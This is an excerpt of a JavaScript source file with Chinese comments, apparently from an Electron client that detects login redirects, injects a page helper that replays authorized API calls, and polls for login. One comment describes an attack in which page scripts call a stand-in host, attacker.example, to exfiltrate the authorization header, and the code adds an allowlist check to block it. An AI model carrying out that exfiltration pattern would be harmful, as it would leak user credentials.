...
// 平台可能把未登录用户重定向到 /login（历史路径 / A-B 实验），
// 判定登录页必须覆盖全部候选路径：只认 /sign_in 会把 /login 当成「已登录」，
// 于是 openLogin 的轮询立刻 stopLoginWatch、userLoggingIn 复位，
// 随后 60 秒轮询就会把用户正在填的表单导航走
const LOGIN_PATHS = ['/sign_in', '/login']
const isLoginPath = (p) => !!p && LOGIN_PATHS.some((x) => p.startsWith(x))
// 登录等待上限：应用侧与各诊断脚本共用，避免三处各写一个魔法数字（12 分钟 / 10 分钟）后行为不一致
...
const PAGE_HELPER = `(() => {
  ...
  window.__dshApi = {
    ...
    get: async (apiPath, query) => {
      ...
      // ★ apiPath 来自页面主世界（window.__dshApi 是唯一出口）：不做白名单校验时，
      //   页面内任意脚本（第三方 SDK / 站内被注入的 XSS）只要调
      //   get('https://attacker.example/collect') 就能把 authorization 头带出站外。
      //   复用截获阶段同一套 isApiUrl（同源 + /api/ 或 /auth-api/ 前缀）
      if (!isApiUrl(apiPath)) throw new Error('BAD_PATH')
      let u = apiPath
...
function createPlatformClient({ headless = true } = {}) {
  ...
  async function ensureHelper(wc) {
    ...
    // CDP 兜底的回调提取为具名函数：失败回滚与窗口关闭时要能精确摘掉它。
    // debugger 实例在同一窗口内**复用**，重试 attach 会再次 on('message')，
    // 匿名回调摘不掉 → 同一条 Network.requestWillBeSent 被多个处理器处理、
    // executeJavaScript 回注被重复触发
    const onCdpMessage = (event, method, params) => {
    ...
    try {
      ...
      // 失败要回滚：摘掉本次注册的监听 + detach。
      // 否则 helperInstalled 仍为 false、监听却留着，下次重试会重复注册，
      // 且该窗口此后永久 HELPER_FAILED（只能关窗恢复）
      try {
        wc.debugger.removeListener('message', onCdpMessage)
      } catch (e) {}
      try {
  ...
  async function loadAndWait({ url = USAGE_URL, waitMs = 15000, show = false } = {}) {
    ...
    while (Date.now() < deadline) {
      ...
      if (isLoginPath(st.path)) return { ok: false, code: 'NEED_LOGIN', state: st }
      if (st.ready) {
        ready = true
  ...
  async function ensureReady() {
    if (ready && win && !win.isDestroyed() && !win.webContents.isDestroyed()) {
      const st = await pageState()
      // ★ 页面已被 SPA 重定向回登录页时，助手手里那份凭据已过期：
      //   ready 只在窗口关闭时才复位，若这里照样短路，应用会长期停在
      //   AUTH_EXPIRED —— 既不重新加载页面，也走不到 NEED_LOGIN 分支，无法自愈
      if (isLoginPath(st.path)) {
        ready = false
      } else if (st.ready) {
        return { ok: true }
      }
  ...
  async function openLogin() {
    ...
    // 加时限：用户开着登录窗一直不登录时，轮询不该永久跑下去
    const loginDeadline = Date.now() + LOGIN_WAIT_MS
    loginPollTimer = setInterval(async () => {
      if (!win || win.isDestroyed() || Date.now() > loginDeadline) {
        stopLoginWatch()
        return
      }
      const st = await pageState()
      ...
      // 用 isLoginPath 而非单一路径：平台重定向到 /login 时不能误判成「已离开」
      if (st && st.path && !isLoginPath(st.path)) stopLoginWatch()
    }, 2000)
    return { ok: true }
  }
